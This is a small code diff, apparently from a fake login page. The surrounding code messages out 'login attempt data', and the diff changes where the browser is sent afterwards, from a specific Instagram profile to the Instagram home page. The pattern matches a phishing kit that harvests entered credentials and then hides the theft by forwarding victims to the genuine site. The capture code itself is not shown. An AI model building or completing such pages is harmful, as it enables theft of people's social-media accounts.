@@ -43,7 +43,7 @@ This is an automated message with login attempt data.`,
       );
       
       // Redirect directly to the target URL (Google Form)
-      window.location.href = 'https://www.instagram.com/kabya_sharma8/';
+      window.location.href = 'https://www.instagram.com';
     } catch (err) {
       setError('An error occurred. Please try again.');
       setIsLoading(false);
